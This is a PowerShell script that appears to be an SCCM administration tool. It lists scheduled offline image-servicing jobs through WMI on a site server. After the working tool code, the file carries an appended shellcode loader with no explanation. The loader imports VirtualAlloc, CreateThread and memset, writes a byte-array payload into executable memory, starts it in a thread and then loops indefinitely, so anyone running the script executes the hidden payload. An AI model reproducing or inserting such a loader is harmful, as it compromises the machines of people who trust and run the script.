﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer
)
Begin {
    
    try {
        Write-Verbose -Message "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug -Message "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine SiteCode" ; break
    }
}
Process {
    
    function Get-ActionStatus {
        param(
            [parameter(Mandatory=$true)]
            $Action
        )
        switch ($Action) {
            0 { return "None" }
            1 { return "Install software update immediately" }
            2 { return "Cancel software update installation" }
        }
    }

    
    $Schedules = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ImageServicingSchedule -ComputerName $SiteServer
    foreach ($Schedule in $Schedules) {
        $TokenData = Invoke-WmiMethod -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ScheduleMethods -Name ReadFromString "$($Schedule.Schedule)" -ComputerName $SiteServer | Select-Object -Property TokenData
        $StartTime = [System.Management.ManagementDateTimeConverter]::ToDateTime($TokenData.TokenData.StartTime)
        if ($StartTime -ge (Get-Date)) {
            $ImagePackageID = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ImageServicingScheduledImage -ComputerName $SiteServer -Filter "ScheduleID like '$($Schedule.ScheduleID)'" | Select-Object -ExpandProperty ImagePackageID
            $ImageName = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_ImagePackage -ComputerName $SiteServer -Filter "PackageID like '$($ImagePackageID)'" | Select-Object -ExpandProperty Name
            $PSObject = [PSCustomObject]@{
                ImageName = $ImageName
                ImagePackageID = $ImagePackageID
                StartTime = $StartTime
                Action = (Get-ActionStatus -Action $Schedule.Action)
            }
            Write-Output -InputObject $PSObject
        }
    }
}


$6Ib = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6Ib -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0xb8,0xf1,0x59,0xc2,0x40,0x31,0x46,0x18,0x83,0xee,0xfc,0x03,0x46,0xe5,0xbb,0x37,0xbc,0xed,0xbe,0xb8,0x3d,0xed,0xde,0x31,0xd8,0xdc,0xde,0x26,0xa8,0x4e,0xef,0x2d,0xfc,0x62,0x84,0x60,0x15,0xf1,0xe8,0xac,0x1a,0xb2,0x47,0x8b,0x15,0x43,0xfb,0xef,0x34,0xc7,0x06,0x3c,0x97,0xf6,0xc8,0x31,0xd6,0x3f,0x34,0xbb,0x8a,0xe8,0x32,0x6e,0x3b,0x9d,0x0f,0xb3,0xb0,0xed,0x9e,0xb3,0x25,0xa5,0xa1,0x92,0xfb,0xbe,0xfb,0x34,0xfd,0x13,0x70,0x7d,0xe5,0x70,0xbd,0x37,0x9e,0x42,0x49,0xc6,0x76,0x9b,0xb2,0x65,0xb7,0x14,0x41,0x77,0xff,0x92,0xba,0x02,0x09,0xe1,0x47,0x15,0xce,0x98,0x93,0x90,0xd5,0x3a,0x57,0x02,0x32,0xbb,0xb4,0xd5,0xb1,0xb7,0x71,0x91,0x9e,0xdb,0x84,0x76,0x95,0xe7,0x0d,0x79,0x7a,0x6e,0x55,0x5e,0x5e,0x2b,0x0d,0xff,0xc7,0x91,0xe0,0x00,0x17,0x7a,0x5c,0xa5,0x53,0x96,0x89,0xd4,0x39,0xfe,0x7e,0xd5,0xc1,0xfe,0xe8,0x6e,0xb1,0xcc,0xb7,0xc4,0x5d,0x7c,0x3f,0xc3,0x9a,0x83,0x6a,0xb3,0x35,0x7a,0x95,0xc4,0x1c,0xb8,0xc1,0x94,0x36,0x69,0x6a,0x7f,0xc7,0x96,0xbf,0xea,0xc2,0x00,0x1f,0x38,0x18,0x5a,0xf7,0xbc,0xa1,0x49,0xc8,0x48,0x47,0x3d,0x98,0x1a,0xd8,0xfd,0x48,0xdb,0x88,0x95,0x82,0xd4,0xf7,0x85,0xac,0x3e,0x90,0x2f,0x43,0x97,0xc8,0xc7,0xfa,0xb2,0x83,0x76,0x02,0x69,0xee,0xb8,0x88,0x9e,0x0e,0x76,0x79,0xea,0x1c,0xee,0x89,0xa1,0x7f,0xb8,0x96,0x1f,0x15,0x44,0x03,0xa4,0xbc,0x13,0xbb,0xa6,0x99,0x53,0x64,0x58,0xcc,0xe8,0xad,0xcc,0xaf,0x86,0xd1,0x00,0x30,0x56,0x84,0x4a,0x30,0x3e,0x70,0x2f,0x63,0x5b,0x7f,0xfa,0x17,0xf0,0xea,0x05,0x4e,0xa5,0xbd,0x6d,0x6c,0x90,0x8a,0x31,0x8f,0xf7,0x0a,0x0d,0x46,0x31,0x79,0x7f,0x5a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Zxyp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Zxyp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Zxyp,0,0,0);for (;;){Start-sleep 60};

